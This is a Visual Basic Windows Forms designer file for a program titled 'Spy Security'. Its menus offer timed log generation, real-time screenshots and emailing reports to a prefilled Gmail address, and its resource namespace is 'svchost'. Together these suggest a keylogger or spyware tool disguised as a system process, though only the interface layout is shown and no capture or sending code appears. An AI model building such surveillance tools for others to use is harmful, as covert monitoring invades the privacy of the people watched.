<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form reemplaza a Dispose para limpiar la lista de componentes.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Requerido por el Diseñador de Windows Forms
    Private components As System.ComponentModel.IContainer

    'NOTA: el Diseñador de Windows Forms necesita el siguiente procedimiento
    'Se puede modificar usando el Diseñador de Windows Forms.  
    'No lo modifique con el editor de código.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.MenuStrip1 = New System.Windows.Forms.MenuStrip
        Me.GuardarToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.GuardarRecopilaciónToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.GenerarLogsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.AToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.ConfiguraciónToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.ImagenTiempoRealToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.DetenerScreensToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.EnviarToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.AToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem
        Me.MailsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.DestinatarioToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.ToolStripTextBox1 = New System.Windows.Forms.ToolStripTextBox
        Me.RemitenteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.ToolStripTextBox2 = New System.Windows.Forms.ToolStripTextBox
        Me.AsuntoToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.ToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem
        Me.AsuntoOffToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.ScreensToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip
        Me.ToolStripStatusLabel1 = New System.Windows.Forms.ToolStripStatusLabel
        Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
        Me.RichTextBox1 = New System.Windows.Forms.RichTextBox
        Me.FolderBrowserDialog1 = New System.Windows.Forms.FolderBrowserDialog
        Me.Timer3 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer4 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer5 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer6 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer7 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer8 = New System.Windows.Forms.Timer(Me.components)
        Me.Timer9 = New System.Windows.Forms.Timer(Me.components)
        Me.MenuStrip1.SuspendLayout()
        Me.StatusStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'MenuStrip1
        '
        Me.MenuStrip1.BackColor = System.Drawing.SystemColors.ActiveCaption
        Me.MenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.GuardarToolStripMenuItem, Me.AToolStripMenuItem, Me.ImagenTiempoRealToolStripMenuItem, Me.EnviarToolStripMenuItem, Me.AToolStripMenuItem1, Me.MailsToolStripMenuItem})
        Me.MenuStrip1.Location = New System.Drawing.Point(0, 0)
        Me.MenuStrip1.Name = "MenuStrip1"
        Me.MenuStrip1.Size = New System.Drawing.Size(965, 24)
        Me.MenuStrip1.TabIndex = 0
        Me.MenuStrip1.Text = "MenuStrip1"
        '
        'GuardarToolStripMenuItem
        '
        Me.GuardarToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.GuardarRecopilaciónToolStripMenuItem, Me.GenerarLogsToolStripMenuItem})
        Me.GuardarToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GuardarToolStripMenuItem.Name = "GuardarToolStripMenuItem"
        Me.GuardarToolStripMenuItem.Size = New System.Drawing.Size(67, 20)
        Me.GuardarToolStripMenuItem.Text = "Archivos"
        '
        'GuardarRecopilaciónToolStripMenuItem
        '
        Me.GuardarRecopilaciónToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GuardarRecopilaciónToolStripMenuItem.Name = "GuardarRecopilaciónToolStripMenuItem"
        Me.GuardarRecopilaciónToolStripMenuItem.Size = New System.Drawing.Size(187, 22)
        Me.GuardarRecopilaciónToolStripMenuItem.Text = "Guardar Recopilación"
        '
        'GenerarLogsToolStripMenuItem
        '
        Me.GenerarLogsToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.GenerarLogsToolStripMenuItem.Name = "GenerarLogsToolStripMenuItem"
        Me.GenerarLogsToolStripMenuItem.Size = New System.Drawing.Size(187, 22)
        Me.GenerarLogsToolStripMenuItem.Text = "Generar / logs [5Min]"
        '
        'AToolStripMenuItem
        '
        Me.AToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ConfiguraciónToolStripMenuItem})
        Me.AToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.AToolStripMenuItem.Name = "AToolStripMenuItem"
        Me.AToolStripMenuItem.Size = New System.Drawing.Size(59, 20)
        Me.AToolStripMenuItem.Text = "Ajustes"
        '
        'ConfiguraciónToolStripMenuItem
        '
        Me.ConfiguraciónToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ConfiguraciónToolStripMenuItem.Name = "ConfiguraciónToolStripMenuItem"
        Me.ConfiguraciónToolStripMenuItem.Size = New System.Drawing.Size(150, 22)
        Me.ConfiguraciónToolStripMenuItem.Text = "Configuración"
        '
        'ImagenTiempoRealToolStripMenuItem
        '
        Me.ImagenTiempoRealToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DetenerScreensToolStripMenuItem})
        Me.ImagenTiempoRealToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ImagenTiempoRealToolStripMenuItem.Name = "ImagenTiempoRealToolStripMenuItem"
        Me.ImagenTiempoRealToolStripMenuItem.Size = New System.Drawing.Size(130, 20)
        Me.ImagenTiempoRealToolStripMenuItem.Text = "Imagen Tiempo real"
        '
        'DetenerScreensToolStripMenuItem
        '
        Me.DetenerScreensToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.DetenerScreensToolStripMenuItem.Name = "DetenerScreensToolStripMenuItem"
        Me.DetenerScreensToolStripMenuItem.Size = New System.Drawing.Size(158, 22)
        Me.DetenerScreensToolStripMenuItem.Text = "Detener Screens"
        '
        'EnviarToolStripMenuItem
        '
        Me.EnviarToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.EnviarToolStripMenuItem.Name = "EnviarToolStripMenuItem"
        Me.EnviarToolStripMenuItem.Size = New System.Drawing.Size(70, 20)
        Me.EnviarToolStripMenuItem.Text = "Opciones"
        '
        'AToolStripMenuItem1
        '
        Me.AToolStripMenuItem1.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.AToolStripMenuItem1.Name = "AToolStripMenuItem1"
        Me.AToolStripMenuItem1.Size = New System.Drawing.Size(51, 20)
        Me.AToolStripMenuItem1.Text = "Autor"
        '
        'MailsToolStripMenuItem
        '
        Me.MailsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DestinatarioToolStripMenuItem, Me.RemitenteToolStripMenuItem, Me.AsuntoToolStripMenuItem, Me.AsuntoOffToolStripMenuItem, Me.ScreensToolStripMenuItem})
        Me.MailsToolStripMenuItem.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.MailsToolStripMenuItem.Name = "MailsToolStripMenuItem"
        Me.MailsToolStripMenuItem.Size = New System.Drawing.Size(47, 20)
        Me.MailsToolStripMenuItem.Text = "Mails"
        '
        'DestinatarioToolStripMenuItem
        '
        Me.DestinatarioToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripTextBox1})
        Me.DestinatarioToolStripMenuItem.Name = "DestinatarioToolStripMenuItem"
        Me.DestinatarioToolStripMenuItem.Size = New System.Drawing.Size(142, 22)
        Me.DestinatarioToolStripMenuItem.Text = "Destinatario"
        '
        'ToolStripTextBox1
        '
        Me.ToolStripTextBox1.Name = "ToolStripTextBox1"
        Me.ToolStripTextBox1.Size = New System.Drawing.Size(100, 23)
        Me.ToolStripTextBox1.Text = "kevinmolinataylor@gmail.com"
        '
        'RemitenteToolStripMenuItem
        '
        Me.RemitenteToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripTextBox2})
        Me.RemitenteToolStripMenuItem.Name = "RemitenteToolStripMenuItem"
        Me.RemitenteToolStripMenuItem.Size = New System.Drawing.Size(142, 22)
        Me.RemitenteToolStripMenuItem.Text = "Remitente"
        '
        'ToolStripTextBox2
        '
        Me.ToolStripTextBox2.Name = "ToolStripTextBox2"
        Me.ToolStripTextBox2.Size = New System.Drawing.Size(100, 23)
        Me.ToolStripTextBox2.Text = "kevinmolinataylor@gmail.com"
        '
        'AsuntoToolStripMenuItem
        '
        Me.AsuntoToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripMenuItem1})
        Me.AsuntoToolStripMenuItem.Name = "AsuntoToolStripMenuItem"
        Me.AsuntoToolStripMenuItem.Size = New System.Drawing.Size(142, 22)
        Me.AsuntoToolStripMenuItem.Text = "Asunto en"
        '
        'ToolStripMenuItem1
        '
        Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
        Me.ToolStripMenuItem1.Size = New System.Drawing.Size(239, 22)
        Me.ToolStripMenuItem1.Text = "Spy Security - Reporte Estado"
        '
        'AsuntoOffToolStripMenuItem
        '
        Me.AsuntoOffToolStripMenuItem.Name = "AsuntoOffToolStripMenuItem"
        Me.AsuntoOffToolStripMenuItem.Size = New System.Drawing.Size(142, 22)
        Me.AsuntoOffToolStripMenuItem.Text = "Asunto off"
        '
        'ScreensToolStripMenuItem
        '
        Me.ScreensToolStripMenuItem.Name = "ScreensToolStripMenuItem"
        Me.ScreensToolStripMenuItem.Size = New System.Drawing.Size(142, 22)
        Me.ScreensToolStripMenuItem.Text = "Screens"
        '
        'Timer1
        '
        Me.Timer1.Interval = 1
        '
        'StatusStrip1
        '
        Me.StatusStrip1.BackColor = System.Drawing.SystemColors.ActiveCaption
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel1})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 606)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Size = New System.Drawing.Size(965, 22)
        Me.StatusStrip1.TabIndex = 2
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'ToolStripStatusLabel1
        '
        Me.ToolStripStatusLabel1.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ToolStripStatusLabel1.Image = CType(resources.GetObject("ToolStripStatusLabel1.Image"), System.Drawing.Image)
        Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(231, 17)
        Me.ToolStripStatusLabel1.Text = "Spy Security By : Developers Security"
        '
        'NotifyIcon1
        '
        Me.NotifyIcon1.Icon = CType(resources.GetObject("NotifyIcon1.Icon"), System.Drawing.Icon)
        Me.NotifyIcon1.Text = "Spy security"
        Me.NotifyIcon1.Visible = True
        '
        'Timer2
        '
        '
        'RichTextBox1
        '
        Me.RichTextBox1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.RichTextBox1.Location = New System.Drawing.Point(0, 24)
        Me.RichTextBox1.Name = "RichTextBox1"
        Me.RichTextBox1.Size = New System.Drawing.Size(965, 604)
        Me.RichTextBox1.TabIndex = 1
        Me.RichTextBox1.Text = Global.svchost.My.Resources.Resources._String
        '
        'Timer3
        '
        Me.Timer3.Interval = 3000
        '
        'Timer4
        '
        '
        'Timer5
        '
        '
        'Timer6
        '
        Me.Timer6.Interval = 300000
        '
        'Timer7
        '
        Me.Timer7.Interval = 10000
        '
        'Timer8
        '
        '
        'Timer9
        '
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(965, 628)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Controls.Add(Me.RichTextBox1)
        Me.Controls.Add(Me.MenuStrip1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MainMenuStrip = Me.MenuStrip1
        Me.Name = "Form1"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Spy security"
        Me.MenuStrip1.ResumeLayout(False)
        Me.MenuStrip1.PerformLayout()
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents MenuStrip1 As System.Windows.Forms.MenuStrip
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents GuardarToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents EnviarToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents NotifyIcon1 As System.Windows.Forms.NotifyIcon
    Friend WithEvents Timer2 As System.Windows.Forms.Timer
    Friend WithEvents ToolStripStatusLabel1 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents RichTextBox1 As System.Windows.Forms.RichTextBox
    Friend WithEvents FolderBrowserDialog1 As System.Windows.Forms.FolderBrowserDialog
    Friend WithEvents Timer3 As System.Windows.Forms.Timer
    Friend WithEvents ImagenTiempoRealToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DetenerScreensToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GuardarRecopilaciónToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GenerarLogsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ConfiguraciónToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Timer4 As System.Windows.Forms.Timer
    Friend WithEvents Timer5 As System.Windows.Forms.Timer
    Friend WithEvents Timer6 As System.Windows.Forms.Timer
    Friend WithEvents Timer7 As System.Windows.Forms.Timer
    Friend WithEvents AToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Timer8 As System.Windows.Forms.Timer
    Friend WithEvents Timer9 As System.Windows.Forms.Timer
    Friend WithEvents MailsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DestinatarioToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripTextBox1 As System.Windows.Forms.ToolStripTextBox
    Friend WithEvents RemitenteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripTextBox2 As System.Windows.Forms.ToolStripTextBox
    Friend WithEvents AsuntoToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AsuntoOffToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ScreensToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem

End Class
